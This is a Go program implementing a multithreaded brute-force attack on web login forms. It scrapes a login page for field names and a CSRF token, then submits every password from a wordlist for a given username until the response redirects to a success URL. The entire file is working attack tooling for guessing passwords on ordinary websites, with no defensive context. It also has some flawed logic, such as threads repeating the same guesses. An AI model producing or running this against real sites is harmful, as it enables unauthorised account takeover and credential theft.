package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
	"golang.org/x/net/html"
)

func parseArguments() (string, string, string, string, int) {
	username := flag.String("l", "", "Username to use for login attempts")
	url := flag.String("u", "", "URL of the login page (e.g., http://example.com/login)")
	redirect := flag.String("redirect", "", "URL to redirect to, indicating a successful login")
	wordlist := flag.String("wordlist", "", "Path to the wordlist file containing passwords")
	threads := flag.Int("threads", 1, "Number of threads to use (default: 1)")
	flag.Parse()

	if *username == "" || *url == "" || *redirect == "" || *wordlist == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}

	return *username, *url, *redirect, *wordlist, *threads
}

func getLoginFormDetails(url string) (string, string, string, string, string) {
	resp, err := http.Get(url)
	if err != nil || resp.StatusCode != 200 {
		fmt.Println("Failed to retrieve the login page.")
		return "", "", "", "", ""
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading the response body.")
		return "", "", "", "", ""
	}

	document, err := html.Parse(strings.NewReader(string(body)))
	if err != nil {
		fmt.Println("Error parsing HTML.")
		return "", "", "", "", ""
	}

	var actionURL, method, usernameField, passwordField, csrfToken string
	var parseForm func(*html.Node)
	parseForm = func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == "form" {
			for _, attr := range n.Attr {
				if attr.Key == "action" {
					actionURL = attr.Val
				}
				if attr.Key == "method" {
					method = strings.ToUpper(attr.Val)
				}
			}

			if actionURL == "" {
				actionURL = url
			}

			for _, child := range n.Children {
				if child.Type == html.ElementNode && child.Data == "input" {
					name := ""
					value := ""
					for _, attr := range child.Attr {
						if attr.Key == "name" {
							name = attr.Val
						}
						if attr.Key == "value" {
							value = attr.Val
						}
					}

					switch {
					case strings.Contains(name, "user") || strings.Contains(name, "login"):
						usernameField = name
					case strings.Contains(name, "pass") || strings.Contains(name, "password"):
						passwordField = name
					case strings.Contains(name, "csrf"):
						csrfToken = value
					}
				}
			}
		}
	}

	parseForm(document)

	return actionURL, method, usernameField, passwordField, csrfToken
}

func attemptLogin(client *http.Client, actionURL, method, usernameField, passwordField, csrfToken, username, password, redirectURL string) bool {
	data := url.Values{}
	data.Set(usernameField, username)
	data.Set(passwordField, password)
	if csrfToken != "" {
		data.Set("csrf_token", csrfToken)
	}

	var req *http.Request
	var err error

	if method == "POST" {
		req, err = http.NewRequest("POST", actionURL, strings.NewReader(data.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		req, err = http.NewRequest("GET", actionURL+"?"+data.Encode(), nil)
	}

	if err != nil {
		fmt.Println("Request error:", err)
		return false
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Request error:", err)
		return false
	}
	defer resp.Body.Close()

	if resp.Request.URL.String() == redirectURL {
		fmt.Printf("[SUCCESS] Login successful with password: %s\n", password)
		return true
	} else {
		fmt.Printf("[FAILURE] Username: %s, Password: %s\n", username, password)
	}

	return false
}

func worker(username, url, redirectURL, wordlist string, wg *sync.WaitGroup, actionURL, method, usernameField, passwordField, csrfToken string) {
	defer wg.Done()

	client := &http.Client{}
	file, err := os.Open(wordlist)
	if err != nil {
		fmt.Println("Error opening wordlist:", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		password := scanner.Text()
		success := attemptLogin(client, actionURL, method, usernameField, passwordField, csrfToken, username, password, redirectURL)
		if success {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading wordlist:", err)
	}
}

func main() {
	username, url, redirectURL, wordlist, threads := parseArguments()

	actionURL, method, usernameField, passwordField, csrfToken := getLoginFormDetails(url)
	if actionURL == "" {
		return
	}

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(username, url, redirectURL, wordlist, &wg, actionURL, method, usernameField, passwordField, csrfToken)
	}

	wg.Wait()
}
